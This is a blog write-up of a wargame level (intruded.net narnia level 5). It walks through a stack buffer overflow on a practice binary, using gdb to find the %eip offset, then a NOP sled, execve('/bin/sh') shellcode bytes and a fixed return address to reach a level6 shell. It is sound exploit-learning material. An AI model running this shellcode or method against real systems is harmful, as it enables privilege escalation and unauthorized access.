Title: intruded.net, narnia: level 5
Date: 2011/09/22 00:31
Tags: shellcode, intruded.net, x86, gdb
Author: Ken Ko

This looks a lot like level 3: executing shellcode in an environment variable by overwriting, presumably, the <strong>%eip</strong>. 

First things first: we find out that

<code>
/wargame/level5 `python -c 'print "A" * 124'`
</code>

will give us <em>Illegal instruction</em>. So, what do we do with this? Why gdb, of course. 

<code>
gdb /wargame/level5
...
(gdb) r `python -c 'print "A" * 124'`
...
(gdb) i r
eax            0x0      0
ecx            0xfffffdf9       -519
edx            0xbffffbd4       -1073742892
ebx            0xb7fdfff4       -1208090636
esp            0xbffff9d0       0xbffff9d0
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0xb8000cc0       -1207956288
eip            0xb7ec7e00       0xb7ec7e00 <__libc_start_main+32>
</code>

Notice that <strong>%ebi</strong> is overwritten--but we want <strong>%eip</strong>! So, let's give this another try:

<code>
(gdb) r `python -c 'print "A" * 124 + "BCDE"'`
...
(gdb) i r
eax            0x0      0
ecx            0xfffffdfd       -515
edx            0xbffffbd4       -1073742892
ebx            0xb7fdfff4       -1208090636
esp            0xbffff9d0       0xbffff9d0
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0xb8000cc0       -1207956288
eip            0x45444342       0x45444342
eflags         0x10246  [ PF ZF IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
</code>

Now we see that the <strong>%eip</strong> gets hit, as well, by our overflow. 

Next, my idea is to NOP slide within these 124 bytes and have the <strong>%eip</strong> jump back into it. Not... totally sure how this will work out. 

Actually, <strong>because ASLR is off</strong>, can I assume that every time I run a program, we will have the same stack space, addresses, etc.? Let's try it out:

<code>
/*
 *      address of a particular string / buffer in memory
 */

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
        printf("%x\n", argv[1]);
}
</code>

Let's run this a few times:

<code>
level5@narnia:/tmp$ ./addr `python -c 'print "A"*128'`
bffffb6b
level5@narnia:/tmp$ ./addr `python -c 'print "a"*128'`
bffffb6b
</code>

Success! Let's continue our gdb session:

<code>
(gdb) r `python -c 'print "\x90"*124 + "\x6b\xfb\xff\xbf"'`
...
eip            0xbffffbdb       0xbffffbdb
...
(gdb) x/x 0xbffffbdb
0xbffffbdb:     0x00000000
(gdb) x/x 0xbffffb6b
0xbffffb6b:     0x90909090
</code>

Not exactly sure why my <strong>%eip</strong> is now ending in <em>db</em> rather than <em>6b</em> because it looks like there isn't anything in that memory location. Going back to our intended <em>0xbffffb6b</em>, however, has us looking at NOPs. 

Brilliant.

Let's get our shellcode from earlier and add it to the end of the buffer. With some snazzy bash to calculate the required amount of NOPs, we can craft our string:

<code>
echo $(( 124 - 61 ))
...
(gdb) r `python -c 'print "\x90" * 63 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x1e\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42" + "\x6b\xfb\xff\xbf"'`
...
sh-3.1$ whoami                  
level5
sh-3.1$        
</code>

d'oh. Let's try this outside of gdb...

<code>
level5@narnia:/tmp$ /wargame/level5 `python -c 'print "\x90" * 63 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x1e\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42" + "\x6b\xfb\xff\xbf"'`
sh-3.1$ 
sh-3.1$ 
sh-3.1$ whoami
level6
</code>

I'm guessing the seteuid() doesn't work because we're trapped within gdb's borders. Just a guess.
